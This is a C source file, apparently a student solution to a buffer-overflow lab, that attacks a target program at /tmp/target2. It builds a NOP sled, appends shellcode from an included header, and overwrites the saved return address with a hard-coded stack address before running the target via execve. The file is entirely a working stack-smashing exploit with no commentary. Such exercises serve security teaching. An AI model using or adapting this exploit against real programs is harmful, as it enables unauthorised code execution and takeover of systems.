#include <stdio.h>
#include <stdlib.h>
#include <string.h>
#include <unistd.h>
#include "shellcode.h"

#define TARGET "/tmp/target2"
#define NOP 0x90
#define BUFSIZE 202

int main(void)
{
  char *args[3];
  char *env[1];
  char buf[BUFSIZE];
  int i, j;

  memset(buf, NOP, BUFSIZE);
  for( j = 0, i = BUFSIZE - sizeof(shellcode)-1; i < BUFSIZE; i++, j++){
    buf[i] = shellcode[j];
  }

  buf[200] = 0x00;
  buf[48] = 'A';
  buf[49] = 'B';
  buf[50] = 'C';
  buf[51] = 'D';
  buf[52] = 0x40;
  buf[53] = 0xfd;
  buf[54] = 0xff;
  buf[55] = 0xbf;
  
  args[0] = TARGET; args[1] = buf; args[2] = NULL;
  env[0] = NULL;

  if (0 > execve(TARGET, args, env))
    fprintf(stderr, "execve failed.\n");

  return 0;
}
